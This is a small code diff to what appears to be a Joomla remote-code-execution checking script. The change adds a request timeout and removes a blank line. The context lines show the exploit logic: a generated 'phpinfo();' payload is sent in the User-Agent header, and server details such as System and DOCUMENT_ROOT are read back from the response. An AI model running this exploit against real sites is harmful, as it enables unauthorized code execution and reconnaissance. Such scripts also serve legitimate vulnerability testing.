@@ -407,7 +407,6 @@ def checkJoomlaRCE(url):
     poc = generate_payload("phpinfo();")
     try:
         result = get_url(url, poc)
-        
         if 'phpinfo()' in result:
             system = getInfoByJoomlaRCE(result, 'System')
             document_root = getInfoByJoomlaRCE(result, 'DOCUMENT_ROOT')
@@ -426,7 +425,7 @@ def get_url(url, user_agent):
     }
     cookies = requests.get(url,headers=headers).cookies
     for _ in range(3):
-        response = requests.get(url, headers=headers,cookies=cookies)    
+        response = requests.get(url, timeout=30, headers=headers,cookies=cookies)    
     return response.content
    
 def php_str_noquotes(data):
